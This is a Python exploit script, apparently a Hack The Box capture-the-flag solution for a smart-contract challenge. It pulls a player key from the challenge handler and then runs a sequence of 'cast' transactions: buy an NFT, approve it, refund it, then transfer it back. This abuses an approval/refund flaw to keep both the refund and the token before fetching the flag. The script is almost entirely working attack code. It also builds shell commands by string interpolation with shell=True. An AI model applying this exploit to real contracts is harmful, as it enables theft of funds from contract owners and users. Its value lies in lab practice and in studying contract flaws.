#!/usr/bin/env python3

import subprocess
from pwn import remote, context, args

context.log_level = "DEBUG"

if args.REMOTE:
    IP = args.HOST
    RPC_PORT = int(args.RPC_PORT)
    TCP_PORT = int(args.HANDLER_PORT)
    RPC_URL = f"http://{IP}:{RPC_PORT}/"
    HANDLER_URL = (IP, TCP_PORT)
else:
    RPC_URL = "http://localhost:8888/"
    HANDLER_URL = ("localhost", 8000)

def csend(contract: str, fn: str, *args, **options):
    base_command = f"cast send {contract} '{fn}' {' '.join(args)}"
    options_str = ' '.join([f"--{key.replace('_', '-')}" + (f" {value}" if value else "") for key, value in options.items()])
    command = f"{base_command} {options_str} --rpc-url {RPC_URL} --private-key {player_pvk}"
    print(f"[*] {command}")
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    if result.returncode == 0:
        print(f"[+] Output:\n{result.stdout}")
    else:
        print(f"[!] Error:\n{result.stderr}")
        exit(1)
    return result.stdout

def ccall(contract: str, fn: str, *args, **options):
    base_command = f"cast call {contract} '{fn}' {' '.join(args)}"
    options_str = ' '.join([f"--{key.replace('_', '-')}" + (f" {value}" if value else "") for key, value in options.items()])
    command = f"{base_command} {options_str} --rpc-url {RPC_URL} --private-key {player_pvk}"
    print(f"[*] {command}")
    result = subprocess.run(command, shell=True, text=True, capture_output=True)
    if result.returncode == 0:
        print(f"[+] Output:\n{result.stdout}")
    else:
        print(f"[!] Error:\n{result.stderr}")
        exit(1)
    return result.stdout

if __name__ == "__main__":
    connection_info = {}
    handler_host, handler_port = HANDLER_URL
    
    ### connect to challenge handler and get connection info ##
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line.startswith("[*]"):
            continue
        if line:
            key, value = line.split(': ')
            key = key.strip()
            value = value.strip()
            connection_info[key] = value

    player_pvk = connection_info['Player Private Key']
    player_addr = connection_info['Player Address']
    setup_addr = connection_info['Setup contract']
    target_addr = connection_info['Target contract']
    
    ### exploitation ###
    frontierNFT = ccall(target_addr, "frontierNFT()")
    frontierNFT = '0x' + frontierNFT.strip()[-40:]
    print(f"[*] FrontierNFT: {frontierNFT}")
    csend(target_addr, "buyNFT()", "--value", "10ether")
    csend(frontierNFT, "approve(address,uint256)", player_addr, "1")
    csend(frontierNFT, "setApprovalForAll(address,bool)", target_addr, "true")
    csend(target_addr, "refundNFT(uint256)", "1")
    csend(frontierNFT, "transferFrom(address,address,uint256)", target_addr, player_addr, "1")

    # get flag
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
    